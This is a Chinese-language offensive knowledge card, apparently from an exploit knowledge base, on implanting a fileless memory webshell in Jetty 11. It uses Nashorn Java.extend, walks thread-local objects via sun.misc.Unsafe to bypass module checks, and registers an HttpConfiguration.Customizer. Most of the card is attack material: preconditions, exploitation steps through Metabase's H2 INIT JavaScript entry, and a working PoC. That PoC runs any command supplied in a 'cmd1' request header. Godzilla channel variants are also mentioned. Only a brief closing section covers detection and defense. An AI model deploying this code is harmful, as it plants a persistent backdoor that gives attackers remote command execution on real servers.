---
id: web-java-component-jetty11-nashorn-javaextend-customizer-memshell
title: Jetty 11 脚本级内存马：Nashorn Java.extend 实现 HttpConfiguration.Customizer，Unsafe 线程对象图自定位注册
type: scenario
domain: web
path: web/java/component
technique: jetty11-nashorn-javaextend-customizer-memshell
aliases:
- Nashorn Customizer 内存马
- Java.extend 内存马
- 脚本引擎实现 Java 接口注册内存马
- Metabase Jetty 内存马
- ThreadGroup 遍历注册 Customizer
- 无类加载内存马
tags:
- jetty
- java
- memshell
- nashorn
- customizer
- jdk11
- unsafe
- threadlocal
- javascript
- metabase
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V686
  verified_at: '2026-11-13T16:05:18+08:00'
  notes: 已通读content.md并逐张核对全部11图：01 Unsafe 能力脑图（内存操作/CAS/内存屏障/Class相关/对象操作/线程调度）；02 threadLocals.table Entry.value=HttpConnection；03 HttpChannelOverHttp 的 _request/_response；04 POST /api/setup/validate 的 H2 INIT //javascript 响应 uid=2000(metabase)；05 HttpChannel.handle 中 getCustomizers 循环调用 customize 源码与 _request.getResponse().getWriter() 调试；06 GET /.ico 带 cmd:id 回显 uid=2000(metabase)、Server Jetty(11.0.14)；07 哥斯拉 payload 注入 400（Error creating or initializing trigger/NullPointerException）；08 哥斯拉测试连接 Success；09 基础信息 java.version=11.0.19+7、Jetty git hash；10 id 回显；11 文件管理。卡内 Nashorn Java.extend 实现 Customizer→Unsafe 遍历 ThreadGroup.threads→threadLocals.table→Entry.value=HttpConnection→getHttpChannel().getHttpConfiguration().addCustomizer、JDK9+ setAccessible 抛 InaccessibleObjectException 改用 Unsafe.objectFieldOffset/getObject 的原理与 PoC 均与原文一致。版本：原文仅有测试环境 JDK 11.0.19+7/Jetty 11.0.14，无受影响区间，卡片未写 affected_versions 正确。dedup：卡自身 exact；top 候选 jetty11-customizer-memshell-godzilla(0.941) 为类文件 defineClass+static
    块自注册+哥斯拉通道路线，本卡为脚本内 Java.extend 适配器、无需提交/加载字节码，前置条件与投递方式不同，作者 dedup_review 成立，保留并互相链接；jetty11-threadlocal-header-memshell(0.938) 为每请求自取连接不注册组件，非同链。未实机复现；frontmatter无sources/source_url。
---

## 一句话结论

在只有 JS 引擎执行入口（如 Metabase 的 H2 INIT `//javascript`）的 Jetty 10/11 进程里，用 Nashorn 的 `Java.extend` 在脚本内直接生成 `HttpConfiguration.Customizer` 接口实现并 `addCustomizer` 注册到当前请求的 HttpConfiguration，即可不落地类文件、不调用 defineClass 地获得由容器逐请求调度的持久内存马；定位 HttpConnection 所需私有字段在模块系统下 `setAccessible` 失败时，用 `sun.misc.Unsafe.objectFieldOffset/getObject` 按内存偏移直读绕过。

## 原理

- **Customizer 是 Jetty 的请求前置扩展点**：`HttpConfiguration` 维护一个 Customizer 列表，请求分发前依次对每个 Customizer 调用 `customize(Connector, HttpConfiguration, Request)`，全部返回后才进入 Server handler；它独立于 servlet/filter 注册体系，Jetty 10/11 迁移到 jakarta.servlet 后依然存在，也不新增任何路由。注册后的实例挂在 HttpConfiguration 上，随进程存活到重启。
- **为什么走线程对象图定位**：Nashorn 执行点（如 H2 init 的 `//javascript` 触发器）拿不到 request 参数；而 Jetty 的 worker 线程把当前连接放进 `ThreadLocal`：`Thread.currentThread().getThreadGroup()` → `threads` 数组 → 每个线程的 `threadLocals`（`ThreadLocal$ThreadLocalMap`）→ `table` 数组 → `Entry.value` = `org.eclipse.jetty.server.HttpConnection`。命中任一 HttpConnection 后 `getHttpChannel()` 取 HttpChannel，`getHttpConfiguration()` 即得配置对象；注入请求自身所在线程必然满足这条链。同一路径还能取 `request.getResponse().getWriter()` 直接在注入请求上回显。
- **为什么 setAccessible 会失败**：JDK 9+ 模块系统下 `ThreadGroup.threads` 属于 java.base 的私有字段，而 Nashorn 脚本所在模块 `jdk.scripting.nashorn.scripts` 未被 `opens java.lang`，`field.setAccessible(true)` 抛 `InaccessibleObjectException`（module java.base does not "opens java.lang" to module jdk.scripting.nashorn.scripts）。
- **Unsafe 为什么能绕过**：`sun.misc.Unsafe` 位于 jdk.unsupported 模块，该模块显式 `opens sun.misc`，脚本可反射取到 `theUnsafe`；`Unsafe.objectFieldOffset(Field)` 只取字段偏移，`Unsafe.getObject(obj, offset)` 由 JVM native 层按偏移读堆对象字段，不经过 Java 反射的模块/访问检查，因此能读 `threads`、`threadLocals`、`table`、`value` 等私有字段。
- **为什么 Java.extend 可行**：`Java.extend(Interface, {...})` 让 Nashorn 自己生成实现该接口的适配器类（由脚本引擎内部机制在内存中定义），脚本只提供 `customize` 函数；适配器实例被 Java 侧当作 Customizer 调用，其中 JS 函数在每次请求时执行。因为不需要攻击者提交或 defineClass 任何字节码，这条实现路径不触发 JDK 11 的反射过滤表限制（对比需 JS loader 清过滤表后再 defineClass 的类文件路线）。
- **持久化差异**：一次性回显马要求命令请求与注入请求同连接/同请求；注册 Customizer 后新请求到达任意已注册路径都会触发 `customize`，效果等价 Tomcat 的 Valve 型内存马。

## 触发条件

- 目标使用 Jetty 10/11（原文为 Metabase 内置 Jetty 11.0.14）。
- 已有在目标 JVM 内执行任意 JS 的能力（Nashorn 可用，例如 H2 INIT `//javascript`、ScriptEngine eval、模板/表达式注入等）。JDK 15 起 Nashorn 被移除，该实现依赖仍带 Nashorn 的 JDK 8–14（原文 JDK 11.0.19）。
- `sun.misc.Unsafe` 可访问（jdk.unsupported 未被 `--limit-modules` 排除）。
- 进程内存在处理过请求的线程，其 ThreadLocal 中留有 HttpConnection（注入请求本身即可满足）。
- Customizer 相关类在 classpath 中（Jetty 容器本身满足）。

## 利用步骤

1. 通过既有 JS eval 入口执行脚本（如向 Metabase `/api/setup/validate` 提交 H2 init 触发器 JavaScript）。
2. 脚本内 `Class.forName("sun.misc.Unsafe")` 取 `theUnsafe`。
3. 从当前线程取 ThreadGroup，读 `threads` 数组，逐线程读 `threadLocals.table[*].value`，命中 `HttpConnection` 后 `getHttpChannel()`。
4. 用 `Java.extend` 定义 Customizer：`customize` 中检查自定义请求头（如 `cmd1`），用 `request.getResponse().getWriter()` 输出命令结果并 `request.setHandled(true)` 截断后续处理。
5. 对第 3 步命中的连接执行 `getHttpConfiguration().addCustomizer(new ProxyCustomizer())`。
6. 之后访问任意路径并带约定头验证命令执行；需要哥斯拉协议通道时，在 `customize` 内实现协议处理或反射加载 payload 类（见关联卡）。

## PoC

```javascript
// exec: 自备命令执行函数（Runtime.exec + 读输出流）
function getUnsafe() {
  var f = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
  f.setAccessible(true);
  return f.get(null);
}
var unsafe = getUnsafe();
var group = java.lang.Thread.currentThread().getThreadGroup();
var tf = group.getClass().getDeclaredField("threads");
var threads = unsafe.getObject(group, unsafe.objectFieldOffset(tf));

var ProxyCustomizer = Java.extend(org.eclipse.jetty.server.HttpConfiguration.Customizer, {
  customize: function (connector, cfg, request) {
    if (request.getHeader("cmd1") != null) {
      request.getResponse().getWriter().println(exec(request.getHeader("cmd1")));
      request.setHandled(true);
    }
  }
});

for (var i = 0; i < threads.length; i++) {
  try {
    var lf = threads[i].getClass().getDeclaredField("threadLocals");
    var map = unsafe.getObject(threads[i], unsafe.objectFieldOffset(lf));
    var tabF = map.getClass().getDeclaredField("table");
    var table = unsafe.getObject(map, unsafe.objectFieldOffset(tabF));
    for (var j = 0; j < table.length; j++) {
      try {
        var vf = table[j].getClass().getDeclaredField("value");
        var v = unsafe.getObject(table[j], unsafe.objectFieldOffset(vf));
        v.getHttpChannel().getHttpConfiguration().addCustomizer(new ProxyCustomizer());
      } catch (e) {}
    }
  } catch (e) {}
}
```

之后任意请求带 `cmd1: id` 即可看到命令输出（原文实测回显 `uid=2000(metabase)`，环境 JDK 11.0.19 + Jetty 11.0.14）。

## 变体与关联

- [[web-java-component-jetty11-customizer-memshell-godzilla]]：同一注册 API 的类文件路线——先绕过 JDK11 反射过滤表 defineClass 出 EvilCustomizer，由 static 块遍历线程自注册，并带哥斯拉 AES 协议通道；本卡是不需要字节码加载的脚本内实现，前置条件与 PoC 不同。
- [[web-java-component-jetty11-threadlocal-header-memshell]]：同样使用 ThreadLocal→HttpConnection→request/response 取链，但每个请求自行取连接、读请求头并写响应头回显，不注册组件。
- [[web-java-classloader-jdk11-reflection-filter-unsafe-defineclass-bypass]]：需要在 JS 里加载自定义类（如哥斯拉 payload 的 defineClass）时的反射过滤表绕过。
- [[web-java-classloader-jdk-module-encapsulation-bypass-unsafe-impl-lookup]]：Unsafe 绕过模块封装的更完整形态（IMPL_LOOKUP/implAddOpens）。
- [[java-memshell-thread-object-graph-field-search]]：线程对象图定位方法论（字段名 BFS）。
- [[web-java-component-metabase-cve-2023-38646-setup-token-h2-init-javascript-rce]]：原文所用注入入口（未授权 setup-token + `/api/setup/validate` H2 INIT JavaScript）。
- 变体：把 Customizer 注册到连接器级全局 HttpConfiguration 而非当前请求配置；请求匹配可扩展到 URI/Cookie；`customize` 内可换成哥斯拉协议或内存马加载逻辑。

## 检测与防御

- 检测：运行期出现 Nashorn JavaAdapter 生成的动态适配器类且实现 `HttpConfiguration$Customizer`；`HttpConfiguration` 的 customizer 列表含非框架来源实例；固定请求头（如 `cmd1`）伴随命令输出；脚本引擎内反射访问 `sun.misc.Unsafe`、`ThreadGroup.threads`、`ThreadLocalMap`。
- 防御：升级 JDK 15+ 移除 Nashorn 或禁用脚本引擎（H2 INIT 等入口封堵）；`--limit-modules` 排除 jdk.unsupported 使 `sun.misc.Unsafe` 不可用；RASP 监控 `addCustomizer` 与脚本引擎适配器生成；Jetty 升级并审计 Customizer 列表。
